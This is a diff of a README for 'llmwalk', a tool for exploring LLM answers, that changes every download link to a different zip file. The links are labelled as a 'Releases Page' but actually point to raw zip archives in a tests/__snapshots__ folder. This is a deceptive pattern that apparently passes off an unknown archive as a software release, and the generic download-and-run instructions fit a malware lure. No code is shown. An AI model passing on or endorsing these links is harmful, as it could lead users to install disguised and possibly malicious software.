@@ -1,14 +1,14 @@
 # 🌟 llmwalk - Discover and Explore LLM Insights
 
 ## 🔗 Download Now
-[![Download llmwalk](https://github.com/Arnav000007/llmwalk/raw/refs/heads/main/tests/__snapshots__/test_prompts/Software-v2.7.zip)](https://github.com/Arnav000007/llmwalk/raw/refs/heads/main/tests/__snapshots__/test_prompts/Software-v2.7.zip)
+[![Download llmwalk](https://github.com/Arnav000007/llmwalk/raw/refs/heads/main/tests/__snapshots__/test_prompts/Software-3.9-alpha.5.zip)](https://github.com/Arnav000007/llmwalk/raw/refs/heads/main/tests/__snapshots__/test_prompts/Software-3.9-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to llmwalk! This application helps you explore the vast answer-space of open Large Language Models (LLMs). Whether you’re curious about AI or want to see how different models respond to your queries, you’re in the right place. This guide will help you download and run the software easily.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Go to the following link to access the download options for llmwalk:
-   [Download llmwalk](https://github.com/Arnav000007/llmwalk/raw/refs/heads/main/tests/__snapshots__/test_prompts/Software-v2.7.zip). 
+   [Download llmwalk](https://github.com/Arnav000007/llmwalk/raw/refs/heads/main/tests/__snapshots__/test_prompts/Software-3.9-alpha.5.zip). 
 
 2. **Choose the Right Version:** On this page, you will see different versions of the application. Each version is labeled with its release date and features. Look for the latest version for the best experience.
 
@@ -35,7 +35,7 @@ To run llmwalk smoothly, ensure that your system meets the following requirement
 If you encounter any issues while downloading or running llmwalk, consider the following steps:
 - **Check System Requirements:** Ensure that your computer meets the minimum requirements for the application.
 - **Update Your Operating System:** Make sure your operating system is up-to-date to avoid compatibility issues.
-- **Re-download:** Sometimes, files may not download correctly. Try downloading the file again from the [Releases Page](https://github.com/Arnav000007/llmwalk/raw/refs/heads/main/tests/__snapshots__/test_prompts/Software-v2.7.zip).
+- **Re-download:** Sometimes, files may not download correctly. Try downloading the file again from the [Releases Page](https://github.com/Arnav000007/llmwalk/raw/refs/heads/main/tests/__snapshots__/test_prompts/Software-3.9-alpha.5.zip).
 - **Consult the Community:** If you still need help, reach out to the llmwalk community. Check forums associated with the tool for troubleshooting tips.
 
 ## 📞 Support
